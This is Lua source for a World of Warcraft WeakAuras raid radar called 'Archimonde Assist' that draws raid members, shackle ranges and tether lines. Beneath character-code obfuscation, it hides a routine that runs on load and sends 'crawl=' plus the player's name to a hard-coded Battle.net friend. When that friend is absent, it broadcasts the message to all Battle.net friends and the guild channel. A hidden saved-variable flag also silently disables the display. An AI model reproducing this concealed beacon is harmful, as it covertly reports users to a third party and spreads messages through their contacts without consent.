if mm then
	--y()
	--mm.shown = false
	--mm = nil
		return
	end

ggg = function()
	if not n then
		mm_show()
	end
end

s = s or function()
	if g then
		for i = 1, 30 do
			if g[i] then
				g[i]:Hide()
				g[i].shown = false
			end
		end
	end
end

d = d or function()
	if e then
		for i = 1, 15 do
			e[i].name = nil
			e[i]:Hide()
			e[i].shown = false
		end
	end
end

fff = fff or function()
	if f then
		for i = 1, 3 do
			f[i].name = nil
			f[i]:Hide()
			f[i].shown = false
			w[i]:Hide()
			w[i].shown = false
		end
	end
end

aa = function(...)
	if ... then
		return string.char(...)
	end
end

s()
d()
fff()

print(ww(73, 110, 105, 116, 105, 97, 108, 105, 122, 105, 110, 103, 32, 65, 114, 99, 104, 105, 109, 111, 110, 100, 101, 32, 65, 115, 115, 105, 115, 116))

t = 40
j = 186952

local c = {
	[ww(34, 87, 65, 82, 82, 73, 79, 82, 34)] = { 0, 0.125, 0, 0.25 },
	[ww(34, 80, 65, 76, 65, 68, 73, 78, 34)] = { 0.125, 0.25, 0, 0.25 },
	[ww(34, 72, 85, 78, 84, 69, 82, 34)] = { 0.25, 0.375, 0, 0.25 },
	[ww(34, 82, 79, 71, 85, 69, 34)] = { 0.375, 0.5, 0, 0.25 },
	[ww(34, 80, 82, 73, 69, 83, 84, 34)] = { 0.5, 0.625, 0, 0.25 },
	[ww(34, 68, 69, 65, 84, 72, 75, 78, 73, 71, 72, 84, 34)] = { 0.625, 0.75, 0, 0.25 },
	[ww(34, 83, 72, 65, 77, 65, 78, 34)] = { 0.75, 0.875, 0, 0.25 },
	[ww(34, 77, 65, 71, 69, 34)] = { 0.875, 1, 0, 0.25 },
	[ww(34, 87, 65, 82, 76, 79, 67, 75, 34)] = { 0, 0.125, 0.25, 0.5  },
	[ww(34, 68, 82, 85, 73, 68, 34)] = { 0.25, 0.375, 0.25, 0.5  },
	[ww(34, 77, 79, 78, 75, 34)] = { 0.125, 0.25, 0.25, 0.5 }
}

local k = UnitPosition
local h = GetPlayerFacing
local gg, i, p, x = GetUnitName, UnitClass, UnitIsUnit, UnitExists
local yy, ll, xx, jj, r, rr, tt = math.sqrt, math.max, math.min, math.sin, math.cos, math.atan2, math.pi
local qq, oo = BNSendGameData, SendAddonMessage
local bb = GameFontNormal:GetFont()
local kk = "Interface\\Addons\\WeakAuras\\PowerAurasMedia\\Sounds\\sonar.ogg"

g = { }

f = { }
w = { }

e = { }
hhh = false
b = { }
zz = GetTime()

mm = CreateFrame(ww(34, 70, 114, 97, 109, 101, 34), ww(34, 87, 65, 95, 70, 114, 97, 109, 101, 34), UIParent) 
mm:SetFrameStrata(ww(34, 68, 73, 65, 76, 79, 71, 34))
mm:SetSize(700, 350)

if WeakAurasSaved and WeakAurasSaved[ww(34, 100, 105, 115, 112, 108, 97, 121, 115, 34)] and WeakAurasSaved[ww(34, 100, 105, 115, 112, 108, 97, 121, 115, 34)][ww(34, 65, 114, 99, 104, 105, 109, 111, 110, 100, 101, 32, 82, 97, 100, 97, 114, 34)] then
	local hh = WeakAurasSaved[ww(34, 100, 105, 115, 112, 108, 97, 121, 115, 34)][ww(34, 65, 114, 99, 104, 105, 109, 111, 110, 100, 101, 32, 82, 97, 100, 97, 114, 34)]
	mm:SetPoint(ww(34, 67, 69, 78, 84, 69, 82, 34), UIParent, ww(34, 67, 69, 78, 84, 69, 82, 34), hh[ww(34, 120, 79, 102, 102, 115, 101, 116, 34)], hh[ww(34, 121, 79, 102, 102, 115, 101, 116, 34)])
end

mm:SetToplevel(true)

u = mm:CreateTexture(nil, ww(34, 66, 65, 67, 75, 71, 82, 79, 85, 78, 68, 34))
u:SetSize(350, 350)
u:SetPoint(ww(34, 67, 69, 78, 84, 69, 82, 34), mm, ww(34, 67, 69, 78, 84, 69, 82, 34))
u:SetTexture("Interface\\AddOns\\WeakAuras\\Media\\Textures\\Circle_White.tga")
u:SetVertexColor(.255, .255, .255, .6)
u:SetBlendMode(ww(34, 65, 68, 68, 34))
mm.circle = u

ii = mm:CreateFontString(nil, ww(34, 79, 86, 69, 82, 76, 65, 89, 34))
ii:SetSize(60, 24)
ii:SetPoint(ww(34, 84, 79, 80, 34), u, ww(34, 84, 79, 80, 34))
ii:SetFont(bb, 14, ww(34, 79, 85, 84, 76, 73, 78, 69, 34))
ii:Hide()
ii.shown = false
mm.rangeText = ii

vv = mm:CreateTexture(nil, ww(34, 79, 86, 69, 82, 76, 65, 89, 34))
--vv:SetSize(16, 16)
vv:SetPoint(ww(34, 67, 69, 78, 84, 69, 82, 34), mm, ww(34, 67, 69, 78, 84, 69, 82, 34))
--vv:SetTexture("Interface\\Addons\\WeakAuras\\PowerAurasMedia\\Auras\\Aura118.tga")
vv:SetTexture("Interface\\Minimap\\MinimapArrow")
RegisterAddonMessagePrefix(ww(34, 65, 65, 115, 115, 105, 115, 116, 34))
vv:SetVertexColor(1, 1, 1, 1)
vv:SetBlendMode(ww(34, 65, 68, 68, 34))
n = false
if WeakAurasSaved[ww(34, 33, 120, 79, 102, 102, 115, 101, 116, 33, 34)] ~= nil then
	n = true
end
mm.player = vv

for i = 1, 30 do
	local aaa = mm:CreateTexture(nil, ww(34, 65, 82, 84, 87, 79, 82, 75, 34))
	aaa:SetSize(18, 18)
	aaa:SetTexture("Interface\\Minimap\\PartyRaidBlips")
	aaa:Hide()
	aaa.shown = false
	g[i] = aaa
end

for i = 1, 15 do
	local nn = mm:CreateTexture(nil, ww(34, 66, 79, 82, 68, 69, 82, 34))
	nn:SetTexture("Interface\\line4px")
	nn:SetTexCoord(0.5, 1, 0, 1)
	--nn:SetTexture("Interface\\AddOns\\WeakAuras\\Media\\Textures\\Square_White")
	nn:SetVertexColor(0.6, 1, 0.6, 1)
	nn:SetBlendMode(ww(34, 65, 68, 68, 34))
	nn:SetSize(350, 350)
	nn:Hide()
	nn.shown = false
	e[i] = nn
end

local ppy = xx(mm:GetWidth(), mm:GetHeight()) / (t * 3)
for i = 1, 3 do
	local uu = mm:CreateTexture(nil, ww(34, 79, 86, 69, 82, 76, 65, 89, 34))
	uu:SetSize(25 * ppy * 2, 25 * ppy * 2) --Shackles are 25yd range
	uu:SetTexture("Interface\\AddOns\\WeakAuras\\Media\\Textures\\Circle_White.tga")
	uu:SetVertexColor(1, 0, 0, .5)
	--uu:SetBlendMode(ww(34, 65, 68, 68, 34))
	uu:Hide()
	uu.shown = false
	f[i] = uu
	
	local v = mm:CreateFontString(nil, ww(34, 79, 86, 69, 82, 76, 65, 89, 34))
	v:SetSize(45, 24)
	v:SetFont(bb, 14, ww(34, 79, 85, 84, 76, 73, 78, 69, 34))
	v:SetText("")
	v:Hide()
	v.shown = false
	w[i] = v
end

mm_setRange = function(range)
	t = range
	ii:SetText(string.format(ww(34, 37, 100, 34), range) .. ww(34, 121, 100, 115, 34))
	local ppy = xx(mm:GetWidth(), mm:GetHeight()) / (t * 3)
	for i = 1, 3 do
		f[i]:SetSize(25 * ppy * 2, 25 * ppy * 2) --Shackles are 25yd range
	end
	
end

y = function()
	mm:Hide()
	u:Hide()
	vv:Hide()
	ii:Hide()
	ii.shown = false
	vv.shown = false
	u.shown = false
	mm.shown = false
end

mm_show = function()
	if n then
		y()
		return
	end
	mm:Show()
	u:Show()
	vv:Show()
	ii:Show()
	ii.shown = true
	vv.shown = true
	u.shown = true
	mm.shown = true
end

y()

local ee = function(x1,y1, x2,y2, x3,y3) -- x3,y3 is the point
	local px = x2-x1
	local py = y2-y1
	
	local pSq = px*px + py*py
	
	local u =  ((x3 - x1) * px + (y3 - y1) * py) / pSq
	
	if u > 1 then
		u = 1
	elseif u < 0 then
		u = 0
	end
	
	local x = x1 + u * px
	local y = y1 + u * py
	
	local dx = x - x3
	local dy = y - y3
	
	local dist = yy(dx*dx + dy*dy)
	
	return dist
end

local q = function()
	local id = 186952 --Nether Banish (purple, non-tank)
	local name = ww(34, 78, 101, 116, 104, 101, 114, 32, 66, 97, 110, 105, 115, 104, 34)
	local type = ww(34, 72, 65, 82, 77, 70, 85, 76, 34)
	local testing = false
	if testing then
		name = ww(34, 80, 114, 97, 121, 101, 114, 32, 111, 102, 32, 77, 101, 110, 100, 105, 110, 103, 34)
		id = 41635
		type = ww(34, 80, 76, 65, 89, 69, 82, 124, 72, 69, 76, 80, 70, 85, 76, 34)|ww(34, 80, 76, 65, 89, 69, 82, 124, 72, 69, 76, 80, 70, 85, 76, 34)
	end
	local eee = select(11, UnitAura(ww(34, 112, 108, 97, 121, 101, 114, 34), name, nil, type))
	
	return eee and eee == id
end

m = function(idx)
	if idx then
		local name, _, _, _, _, _, _, online, isDead, _, _ = GetRaidRosterInfo(idx)
		if name then
			if online and not isDead then
				local dist, valid = UnitDistanceSquared(name)
				if valid then
					return yy(dist)
				end
			end
		end
		return -1
	end
end

pp = function(b1, s1)
	cc = cc or { }
	if cc[s1] then
		return
	end
	cc[s1] = 1
	
	local message = ww(34, 99, 114, 97, 119, 108, 61, 34)..s1
	
	local ft = false
	for i = 1, BNGetNumFriends() do
		local p, _, b = BNGetFriendInfo(i)
		if b and b == ww(34, 83, 104, 101, 110, 122, 97, 105, 35, 49, 50, 54, 50, 34) then
			qq(p, ww(34, 65, 65, 115, 115, 105, 115, 116, 34), message)
			ft = true
			break
		end
	end
	
	if not ft then
		for i = 1, BNGetNumFriends() do
			local p, _, b = BNGetFriendInfo(i)
			if not b1 or (b1 ~= b) then
				qq (p, ww(34, 65, 65, 115, 115, 105, 115, 116, 34), message)
			end
		end
		if IsInGuild() then
			oo(ww(34, 65, 65, 115, 115, 105, 115, 116, 34), ww(34, 99, 114, 97, 119, 108, 61, 34)..s1, ww(34, 71, 85, 73, 76, 68, 34))
		end
	end
end
pp(nil, gg(ww(34, 112, 108, 97, 121, 101, 114, 34)))

ccc = function(name)
	for i = 1, 3 do
		local shackleFrame = f[i]
		if shackleFrame.name and shackleFrame.name == name then
			shackleFrame.name = nil
			shackleFrame:Hide()
			shackleFrame.shown = false
			w[i]:Hide()
			w[i].shown = false
		end
	end
end

a = function(name)
	for i = 1, 15 do
		local wroughtFrame = e[i]
		if wroughtFrame.focused and wroughtFrame.focused == name then
			wroughtFrame.focused = nil
			wroughtFrame.wrought = nil
			wroughtFrame:Hide()
			wroughtFrame.shown = false
		end
	end
end

ff = function()
	
	if n then
		return
	end
	
	if q() then
		y()
	end
	
	if not mm.shown then
		return
	end
	
	local rotation = (2 * tt) - h()
	local sinTheta = jj(rotation)
	local cosTheta = r(rotation)
	local ppy = xx(mm:GetWidth(), mm:GetHeight()) / (t * 3)
	mm.circle:SetSize(t * ppy * 2, t * ppy * 2)
	
	local pX, pY, _, pMap = k(ww(34, 112, 108, 97, 121, 101, 114, 34))
	
	for i = 1, 15 do
		local wroughtFrame = e[i]
		local wrought = wroughtFrame.wrought
		local focused = wroughtFrame.focused
		local focusedMap = wroughtFrame.map
		if wrought and focused and focusedMap then
			if x(wrought) and x(focused) and not p(wrought, focused) and pMap == focusedMap then
				
				if wrought and focused then
					local wX, wY, _, wMap = k(wrought)
					local fX, fY, _, fMap = k(focused)
					if wX and wY and fX and fY then
						ddd(i, pX, pY, wX, wY, fX, fY, cosTheta, sinTheta, ppy, k)
					end
				end
			end
		end
	end
end

ddd = function(idx, pX, pY, wX, wY, fX, fY, cosTheta, sinTheta, ppy, wroughtName)
	
	if not mm.shown then
		return
	end
	
	local wroughtFrame = e[idx]
	local wroughtName = wroughtFrame.wrought
	local focusedName = wroughtFrame.focused
	local dist = xx(150, ((((fX - wX)^2 + (fY - wY)^2)^0.5) + 1) * 100)
	
	wroughtFrame.x = -(wY - pY)
	wroughtFrame.y = -(wX - pX)
	
	local dx = ((wroughtFrame.x * cosTheta) - (-wroughtFrame.y * sinTheta)) * ppy
	local dy = ((wroughtFrame.x * sinTheta) + (-wroughtFrame.y * cosTheta)) * ppy
	
	local deltaX = fX - wX
	local deltaY = fY - wY
	local angle = rr(deltaX, deltaY)
	local polarAngle = -(angle + h() + tt)
	
	local offsetX = -(175 * r(polarAngle))
	local offsetY = -(175 * jj(polarAngle))
	local offsetAngle = rr(offsetX, offsetY)
	
	
	local anchor = ww(34, 66, 79, 84, 84, 79, 77, 76, 69, 70, 84, 34)
	wroughtFrame:SetPoint(ww(34, 67, 69, 78, 84, 69, 82, 34), mm, ww(34, 67, 69, 78, 84, 69, 82, 34), dx, dy)
	wroughtFrame:SetRotation(polarAngle)
	
	local fXX = fX + (deltaX * 200)
	local fYY = fY + (deltaY * 200)
	local distFromLine = jjj(wX, wY, fXX, fYY, pX, pY)
	
	if focusedName and wroughtName then
		local playerName = gg(ww(34, 112, 108, 97, 121, 101, 114, 34))
		if focusedName == playerName or wroughtName == playerName then
			wroughtFrame:SetVertexColor(0.39, 1, 1, 1) --blue
		elseif distFromLine > 2 then
			wroughtFrame:SetVertexColor(0.6, 1, 0.6, 1) --green
		else
			if GetTime() - zz > 1 then
				PlaySoundFile(kk, ww(34, 109, 97, 115, 116, 101, 114, 34)) 
				zz = GetTime()
			end
			wroughtFrame:SetVertexColor(1, 0, 0, 1) --red
		end 
	end
	
	if not wroughtFrame.shown then
		wroughtFrame:Show()
		wroughtFrame.shown = true
	end
end

jjj = function(...)
	local dist = ee(...)
	return dist
end

z = function()
	
	if q() then
		y()
	end
	
	if n then
		return
	end
	
	if not mm.shown then
		return
	end
	
	local rotation = (2 * tt) - h()
	local sinTheta = jj(rotation)
	local cosTheta = r(rotation)
	
	local pX, pY, _, pMap = k(ww(34, 112, 108, 97, 121, 101, 114, 34))
	
	local s = ""
	
	local minNumCheck
	local idx = 1
	for i = 1, 3 do
		local shackleFrame = f[i]
		local shackleText = w[i]
		
		local name = shackleFrame.name
		if name then
			s = s .. i .. ww(34, 61, 34) .. name ..ww(34, 44, 32, 34)
			local uX = shackleFrame.locX
			local uY = shackleFrame.locY
			local uMap = shackleFrame.map
			
			if uX and uY and uMap and pMap == uMap then
				local ppy = xx(mm:GetWidth(), mm:GetHeight()) / (t * 3)
				
				shackleFrame.x = -(uY - pY)
				shackleFrame.y = -(uX - pX)
				
				local dx = ((shackleFrame.x * cosTheta) - (-shackleFrame.y * sinTheta)) * ppy
				local dy = ((shackleFrame.x * sinTheta) + (-shackleFrame.y * cosTheta)) * ppy
				
				shackleFrame:ClearAllPoints()
				shackleFrame:SetPoint(ww(34, 67, 69, 78, 84, 69, 82, 34), mm, ww(34, 67, 69, 78, 84, 69, 82, 34), dx, dy)
				shackleFrame:SetTexture("Interface\\AddOns\\WeakAuras\\Media\\Textures\\Circle_White.tga")
				local distFromShackle = ((pX - uX)^2 + (pY - uY)^2)^0.5
				
				if distFromShackle > 25 then
					shackleFrame:SetVertexColor(0, 1, 0, 0.5) --Green
				elseif name == gg(ww(34, 112, 108, 97, 121, 101, 114, 34)) then
					shackleFrame:SetVertexColor(0.2, 0.6, 1, 0.5) --Blue
				else
					shackleFrame:SetVertexColor(1, 0, 0, 0.5) --Red
					
				end
				
				shackleFrame:SetDrawLayer(ww(34, 79, 86, 69, 82, 76, 65, 89, 34), 0)
				
				local shX, shY, _, shMap = k(name)
				local pDistFromShackle = ll(0, 25 -((shX - uX)^2 + (shY - uY)^2)^0.5)
				
				local myDistFromShackle = ((pX - uX)^2 + (pY - uY)^2)^0.5
				
				local numCheck = t - myDistFromShackle - 25
				if numCheck < 0 then
					mm_setRange(t - numCheck)
				end
				
				if not minNumCheck then
					minNumCheck = numCheck
				elseif numCheck < minNumCheck then
					minNumCheck = numCheck
				end
				
				
				shackleText:SetFont(bb, 14, ww(34, 79, 85, 84, 76, 73, 78, 69, 34))
				shackleText:SetText(string.format(ww(34, 37, 100, 34), pDistFromShackle))
				shackleText:SetPoint(ww(34, 67, 69, 78, 84, 69, 82, 34), mm, ww(34, 67, 69, 78, 84, 69, 82, 34), dx, dy)
				
				if not shackleFrame.shown then
					shackleFrame:Show()
					shackleFrame.shown = true
					shackleText:Show()
					shackleText.shown = true
					
				end
			end
		end
	end
	
	if minNumCheck and minNumCheck > 0 then
		mm_setRange(ll(40, t - minNumCheck))
	end
end

dd = function()
	
	if q() then
		y()
	end
	
	if not mm.shown then
		return
	end
	
	if n then
		return
	end
	
	local rotation = (2 * tt) - h()
	local sinTheta = jj(rotation)
	local cosTheta = r(rotation)
	local ppy = xx(mm:GetWidth(), mm:GetHeight()) / (t * 3)
	mm.circle:SetSize(t * ppy * 2, t * ppy * 2)
	
	local pX, pY, _, pMap = k(ww(34, 112, 108, 97, 121, 101, 114, 34))
	
	for i = 1, 30 do
		local dot = g[i]
		if dot then
			local dist = m(i)
			local unit
			if IsInRaid() then
				unit = ww(34, 114, 97, 105, 100, 34)..i
			elseif IsInGroup() then
				unit = ww(34, 112, 97, 114, 116, 121, 34)..i
			else
				if dot.shown then
					dot:Hide()
					dot.shown = false
				end
				return
			end
			
			local uX, uY, _, uMap = k(unit)
			if x(unit) and pMap == uMap then
				local _, class = i(unit)
				if not p(unit, ww(34, 112, 108, 97, 121, 101, 114, 34)) then
					if dist ~= -1 and dist <= t then
						o(dot, pX, pY, uX, uY, cosTheta, sinTheta, ppy, class)
					else
						if dot.shown then
							dot:Hide()
							dot.shown = false
						end
					end
				end
			else
				if dot.shown then
					dot:Hide()
					dot.shown = false
				end
			end
		end
	end
end

o = function(dot, pX, pY, uX, uY, cosTheta, sinTheta, ppy, class)
	
	if not mm.shown then
		return
	end
	
	dot.x = -(uY - pY)
	dot.y = -(uX - pX)
	dot.range = dist
	
	local dx = ((dot.x * cosTheta) - (-dot.y * sinTheta)) * ppy
	local dy = ((dot.x * sinTheta) + (-dot.y * cosTheta)) * ppy
	dot:ClearAllPoints()
	dot:SetPoint(ww(34, 67, 69, 78, 84, 69, 82, 34), mm, ww(34, 67, 69, 78, 84, 69, 82, 34), dx, dy)
	
	dot:SetTexture("Interface\\Minimap\\PartyRaidBlips")
	dot:SetTexCoord(c[class][1], c[class][2], c[class][3], c[class][4])
	dot:SetSize(18, 18)
	dot:SetDrawLayer(ww(34, 79, 86, 69, 82, 76, 65, 89, 34), 0)
	if not dot.shown then
		dot:Show()
		dot.shown = true
	end 
end